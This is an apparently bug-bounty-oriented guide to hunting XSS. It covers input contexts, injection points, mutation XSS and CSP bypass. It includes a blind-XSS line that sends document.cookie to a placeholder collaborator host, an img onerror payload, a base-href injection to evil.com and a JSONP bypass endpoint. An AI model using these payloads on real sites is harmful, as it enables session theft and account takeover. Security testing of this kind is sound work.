XSS  -  Overview
XSS is alive. Every app I touch with a rich text editor, a search bar that reflects input, or a JS-heavy SPA has a surface worth poking. The mistake most hunters make is firing <script>alert(1)</script> everywhere and calling it a day when nothing pops. Real XSS hunting is about reading the context  -  where does my input land, and what rules govern that landing zone?
The Mental Model

Context-First Methodology
Before I send a single payload, I do three things:

Trace the reflection  -  view-source or DevTools, find exactly where my input lands in the DOM.
Identify the context  -  raw HTML, inside a tag attribute, inside a JS string, inside a JS block, inside a JSON blob.
Pick the minimal breaking payload  -  not a shotgun, a scalpel.

The context dictates everything. A payload that works in an HTML body context does nothing inside a value="" attribute without first closing the quote.

High-Value Targets I Always Check

Search bars (reflected)
Comment/review fields (stored)
Profile fields  -  display name, bio, website URL (stored, often hits admin panels)
File upload names (stored, hits wherever files are listed)
Error messages that echo back user input
404 pages that reflect the path
Redirect parameters (?next=, ?returnUrl=, ?redirect=)
postMessage handlers in SPAs
URL fragment (#) consumed by JS

Impact  -  Making It Count in the Report
A raw alert(1) gets triaged as low half the time. Escalate to:

document.cookie exfil to a Burp Collaborator or xsshunter.com
Account takeover via session hijacking
CSRF bypass (XSS makes same-origin requests)
Keylogging on login forms
Credential harvesting via DOM manipulation

// Blind XSS callback  -  drop this in any stored field
fetch('https://YOUR.BURPCOLLABORATOR.NET/?c='+btoa(document.cookie))
mXSS (Mutation XSS)
mXSS happens when a sanitiser processes a string that looks clean, but the HTML parser later normalises that string into something dangerous. The sanitiser and the parser disagree on what the markup means.
Classic example  -  a sanitiser passes this as safe because it looks like a benign attribute:
<p title="</p><img src=x onerror=alert(1)>">text</p>
In some parser/sanitiser combinations, the parser's tree-building algorithm interprets the attribute value differently from how the sanitiser read it, and the onerror handler ends up attached to the DOM.
mXSS is most relevant when:

The app uses an older version of DOMPurify (pre-2.x had mXSS cases)
Server-side sanitisers (e.g. OWASP Java HTML Sanitizer, Bleach) feed into client-side parsers that don't share the same grammar
innerHTML assignments happen after a sanitiser has approved the string

When testing rich text fields: include payloads with namespace confusion (<svg><p>, <math><mi>) alongside standard vectors. These trigger the parser re-entry behaviour that mXSS exploits.

CSP Evasion Decision Tree
Check the Content-Security-Policy header before sending any payload. Then follow this path:
flowchart TD
    A["Read the CSP"] --> B{"script-src present?"}
    B -->|No CSP| C["No restrictions - standard payloads work"]
    B -->|Yes| D{"'unsafe-inline' allowed?"}
    D -->|Yes| E["Inline scripts work directly"]
    D -->|No| F{"'nonce-*' present?"}
    F -->|Yes| G["Check if nonce is static across requests"]
    G -->|Static| H["Use the nonce in your payload"]
    G -->|Dynamic| I{"'unsafe-eval' allowed?"}
    F -->|No| I
    I -->|Yes| J["DOM-based eval sinks work"]
    I -->|No| K{"allowlisted CDN?"}
    K -->|Yes| L["Check jsDelivr / unpkg for JSONP or attacker-controlled packages"]
    K -->|No| M{"'self' in script-src?"}
    M -->|Yes| N["Hunt JSONP on the same domain"]
    M -->|No| O["Look for base-uri missing, then inject base href"]

Quick checks that catch most bypasses:

base-uri directive missing: inject <base href="evil.com"> to redirect relative scripts
object-src missing or 'unsafe-inline': plugins and data URIs may still execute
Allowlisted *.google.com: accounts.google.com/o/oauth2/revoke(1) is a classic JSONP endpoint
